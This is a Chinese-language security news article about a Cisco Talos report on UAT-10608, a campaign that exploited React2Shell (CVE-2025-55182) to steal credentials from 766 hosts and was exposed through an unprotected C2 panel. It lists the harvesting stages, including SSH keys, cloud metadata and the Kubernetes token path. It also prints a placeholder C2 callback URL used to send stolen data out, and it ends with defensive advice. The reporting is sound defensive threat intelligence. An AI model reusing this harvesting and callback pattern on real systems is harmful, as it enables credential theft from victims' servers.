---
title: 致命失误：黑客控制面板裸奔遭思科反溯
url: https://mp.weixin.qq.com/s/QU_OjdpC8Eb8oFpBT0_ujg
source: Doonsec's feed
date: 2026-04-04
fetch_date: 2026-04-05T04:36:55.073363
---

# 致命失误：黑客控制面板裸奔遭思科反溯

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lQ1jXOMq3d3SIHjaAq2KcZNialb3vk5xP5cdY8c3YibiaicDKmnS5eEApypl6lUmklC796nYQ6lPlY7KZ9FjXhZsg9IxZI7ric1ouGPKjBvRVvr8/0?wx_fmt=jpeg)

# 致命失误：黑客控制面板裸奔遭思科反溯

原创

网空闲话
网空闲话

网空闲话plus

![]()

在小说阅读器中沉浸阅读

# 思科Talos威胁情报团队4月2日披露了一个被追踪为 **UAT-10608** 的自动化凭证窃取行动。该组织利用四个月前公开的React2Shell漏洞（CVE-2025-55182），在**短短24小时内**攻陷了至少**766台主机**，横跨多个地理区域和云服务商。然而，攻击者犯下了一个不可饶恕的操作失误——其核心管理面板“NEXUS Listener”的**一个实例未设置任何密码保护**，直接暴露在公网。这一疏忽使得研究人员得以完整窥见该犯罪团伙的运作全貌、收割规模以及被盗数据的精确细节。

![](https://mmbiz.qpic.cn/mmbiz_jpg/lQ1jXOMq3d0yWJhyR083EylKkjsqwkIaxHCEoib7cx4Jgn2kkxETpbgOLibqiasrtQficyz7icXmA9sGhGUAzBOA5ICeKHOrY2ItWBrYV1rM5K0w/640?wx_fmt=webp&from=appmsg)

## 一、攻击链条：从React2Shell到多阶段自动收割

UAT-10608的攻击起点是面向公网的Next.js应用。这些应用因使用存在**CVE-2025-55182**（俗称“React2Shell”）的React服务器组件而沦为猎物。该漏洞是一个**预认证远程代码执行漏洞**：攻击者向服务器函数端点发送恶意序列化载荷，无需任何身份验证，即可在服务端Node.js进程中执行任意代码。

一旦漏洞利用成功，攻击者的自动化工具包立即接管。初始的React漏洞利用会投放一个小型投放器，通常是一个存放在`/tmp`目录下、**随机命名且以点号开头**的隐藏脚本（例如`/tmp/.eba9ee1e4.sh`），并通过`nohup`执行以维持后台运行。

该投放器随后获取并运行一个**多阶段凭证收割脚本**。脚本执行后，会依次完成以下收集阶段：

* **environ** – 转储运行中进程的环境变量
* **jsenv** – 提取JavaScript运行时中JSON格式的环境配置
* **ssh** – 收割SSH私钥和`authorized_keys`文件
* **tokens** – 通过模式匹配提取各类凭证字符串
* **history** – 捕获Shell命令历史
* **cloud\_meta** – 查询AWS/GCP/Azure的云元数据API
* **k8s** – 提取Kubernetes服务账户令牌
* **docker** – 枚举运行中的容器配置
* **cmdline** – 列出所有进程的命令行
* **proc\_all** – 聚合所有进程的环境变量

框架使用一个`meta.json`文件跟踪每个阶段的执行状态。每个阶段完成后，受害主机都会向C2服务器（运行NEXUS Listener组件）发起HTTP回调，端口通常为**8080**，并携带参数：`h=<主机名>`、`l=<阶段名>`、`id=<唯一标识>`。例如：

```
http://<C2_IP>:8080/h=<VICTIM_HOSTNAME>&l=info&id=123abc45http://<C2_IP>:8080/h=<VICTIM_HOSTNAME>&l=jsenv&id=123abc45
```

## 二、触目惊心的收割数据：766台主机沦陷

通过一个未加密码保护的NEXUS Listener实例，思科Talos获得了截至2026年4月2日（报告发布当日）的精确统计数据：

| 指标 | 数量 | 占比 |
| --- | --- | --- |
| 被入侵主机 | 766 | 100% |
| 包含数据库凭证的主机 | ~701 | **91.5%** |
| 包含SSH私钥的主机 | ~599 | **78.2%** |
| 包含AWS凭证的主机 | ~196 | **25.6%** |
| 包含Shell命令历史的主机 | ~245 | **32.0%** |
| 包含实时Stripe API密钥的主机 | ~87 | **11.4%** |
| 包含GitHub令牌的主机 | ~66 | **8.6%** |
| 收集的文件总数 | 10,120 | – |

**环境变量与API密钥**：`environ.txt`和`jsenv.txt`文件暴露了海量第三方服务凭证，包括：OpenAI、Anthropic、NVIDIA NIM、OpenRouter、Tavily等AI平台密钥；Stripe live密钥（`sk_live_*`）；AWS访问密钥/秘钥对、Azure订阅凭证；SendGrid、Brevo等邮件API密钥；Telegram机器人令牌；GitHub/GitLab个人访问令牌；以及包含主机名、端口、用户名和明文密码的完整数据库连接字符串。

**SSH私钥**：在78.2%的主机中，`ssh.txt`文件包含完整的PEM编码私钥（ED25519和RSA格式）及`authorized_keys`条目。这些密钥可直接用于横向移动，攻击者可借此访问任何信任该主机密钥的系统。

**云凭证**：`aws_full.txt`和`cloud_meta.txt`阶段成功查询了AWS实例元数据服务（IMDS）、GCP元数据服务器和Azure IMDS，获取了与IAM角色关联的临时凭证，可能允许攻击者访问S3存储桶、EC2控制平面甚至Secrets Manager。

**Kubernetes令牌**：`k8s.txt`阶段读取了默认挂载的服务账户令牌（路径`/var/run/secrets/kubernetes.io/serviceaccount/token`），若RBAC配置不当，可导致集群资源枚举乃至集群管理员权限提升。

**Docker容器信息**：约6%的主机中，`docker.txt`枚举了所有运行中的容器、镜像、暴露端口、网络配置、挂载点及环境变量，其中发现了phpMyAdmin、n8n工作流自动化等高风险服务。

**Shell命令历史**：`history.txt`中观察到的模式包括带明文密码的MySQL客户端调用（`mysql -u root -p`）以及数据库服务重启命令（`/etc/init.d/mysqld restart`），为攻击者提供了进一步的操作情报。

## 三、NEXUS Listener：一个暴露的“犯罪控制台”

所有被窃数据最终汇入一个名为**“NEXUS Listener”**的Web应用程序。该应用是攻击者的核心管理平台，以图形化界面展示收割信息，并提供预编译统计数据与搜索功能。![](https://mmbiz.qpic.cn/sz_mmbiz_png/lQ1jXOMq3d1giabVGR9TLYszT8kxI8HcdibYGiaQq71ibYK4F30VCR9denuB1RQ6D1gI9NkBhUGEtMfoJCBqqQmmYK87aw8ZEnXickiabxZ4FYickw/640?wx_fmt=png&from=appmsg)![]()

**图1** – NEXUS Listener登录提示

在绝大多数情况下，该Web前端受密码保护。然而，**至少有一个实例被完全暴露**，无需任何凭证即可访问。研究人员由此看到了以下内容：

**![](https://mmbiz.qpic.cn/mmbiz_png/lQ1jXOMq3d1IfhibhtNuCdCgcyoebae9ibY6GxhFMcJrGJa0JJG0vAEjmQBgXicQKnk9TuNFTbfPc87CfA9rybR4L3w8rDyxqbdRg1WwKZeWibs/640?wx_fmt=png&from=appmsg)![]()**

**图2** – NEXUS Listener主页，显示统计信息，包括766台主机、各类凭证数量以及应用运行时间

主页显示，该自动化的利用与收割框架在**24小时内**成功攻陷了766台主机。应用标题中明确标注了 **“v3”** ，表明该框架已经历了至少三个版本的迭代，是一个成熟且持续演进的黑客工具包。

**![](https://mmbiz.qpic.cn/mmbiz_png/lQ1jXOMq3d3oeiciaxoicFIiaFEibrBzr9d6GzL6u9beRHAQegsiccxHrhwaUYpyTZ8SPmJwNJJXT8sQ6NyH2KXicnbJtqZYWnMuGa9ml2YBQKOKxg/640?wx_fmt=png&from=appmsg)![]()**

**图3** – NEXUS Listener受害者列表，可浏览所有被入侵主机

用户可点击任意一台主机，调出对应所有收割阶段的详细数据菜单。

**![](https://mmbiz.qpic.cn/sz_mmbiz_png/lQ1jXOMq3d21Cp0xfrxnSPS8CF2sAv3DibYAN9RKh5KUwm6GBGPKCCiaTXADN0ico6sAicVwAyBKW9EZFpjxkMWrJsFpAricbO0PtibxHbfhR2yxU/640?wx_fmt=png&from=appmsg)**

**图4** – NEXUS Listener单个受害者的凭证详情，包含各类密钥的明文展示

## 四、评论与警示：疏忽的代价是“毁灭性的”

此次事件中，攻击者的失误与漏洞未及时修补的受害者一样，都源于同一个词——**疏忽**。

补丁管理提供商Action1的现场首席技术官Gene Moody在评价此事时指出：“**这一切都与疏忽和效率有关。** React2Shell迅速满足了攻击者所寻求的所有条件：公开披露、可靠的利用以及面向互联网的暴露。”他强调，对于暴露的系统而言，“**已经没有任何真正意义上的隐蔽性了。**”

Moody进一步警告：“攻击始于你未能及时打补丁之时。……一旦这类信息落入不法分子之手，一个错误就可能瞬间演变成所有错误。**损失可能是毁灭性的，而且无法挽回。**”他建议组织“把修补漏洞当成牙痛来对待——一旦出现任何迹象，就尽快处理，否则只会带来更多痛苦。”

思科Talos在报告中明确指出：**该数据集中的每一份凭证都应被视为完全泄露**。实时Stripe密钥可导致欺诈性扣款和退款操纵；拥有广泛IAM权限的AWS密钥可导致云基础设施被接管；数据库连接字符串中的明文密码可直接访问用户PII和财务记录。而大量暴露的SSH私钥创造了一种**能够存活于应用凭证轮换之后的持久横向移动风险**。

此外，部分主机中发现的包注册表认证文件（`pkgauth.txt`，包含npm和pip配置中的注册表凭证）可能被用于供应链攻击——在合法维护者的身份下发布恶意软件包。

## 五、组织应立即采取的行动

思科Talos给出了以下建议：

1. **审计代码**：检查`getServerSideProps`和`getStaticProps`实现，确保没有将密钥或仅限服务器的环境变量传递给客户端组件。严格执行`NEXT_PUBLIC_`前缀的使用纪律。
2. **立即轮换所有凭证**：若怀疑环境与所述受害画像有任何重叠，立即轮换数据库密码、云密钥、API令牌和SSH密钥。
3. **强化云元数据服务**：在所有AWS EC2实例上强制实施**IMDSv2**，阻止未经身份验证的元数据服务滥用。
4. **隔离SSH密钥**：避免在不同系统或环境间复用同一SSH密钥对。
5. **启用云服务商的原生密钥扫描**：AWS、GitHub等提供的秘密扫描功能可检测并告警泄露的凭证。
6. **部署针对性防护**：使用针对Next.js攻击模式的WAF规则集或RASP（运行时应用自我保护）。
7. **审计容器环境**：遵循最小权限原则，确保应用容器无法访问主机SSH代理、包含敏感数据的主机文件系统挂载点以及权限过宽的IAM实例角色。

思科Talos已向GitHub、AWS等行业合作伙伴通报了暴露的凭证，并协助隔离。同时，SNORT® ID 65554可用于检测CVE-2025-55182的利用行为。完整的入侵指标（IOCs）已在思科Talos的GitHub仓库中发布。

参考资源

1、https://blog.talosintelligence.com/uat-10608-inside-a-large-scale-automated-credential-harvesting-operation-targeting-web-applications/

2、https://www.csoonline.com/article/4154188/security-lapse-lets-researchers-see-react2shell-hackers-dashboard.html

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/0KRmt3K30icVGnSe4zPGUZ2ibceYmDIib04vz21so50Ycia1QhibUCGKKecTyBl99eoCibzVwOANCyosia05JyYzyJdMQ/0?wx_fmt=png)

网空闲话plus

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/0KRmt3K30icVGnSe4zPGUZ2ibceYmDIib04vz21so50Ycia1QhibUCGKKecTyBl99eoCibzVwOANCyosia05JyYzyJdMQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过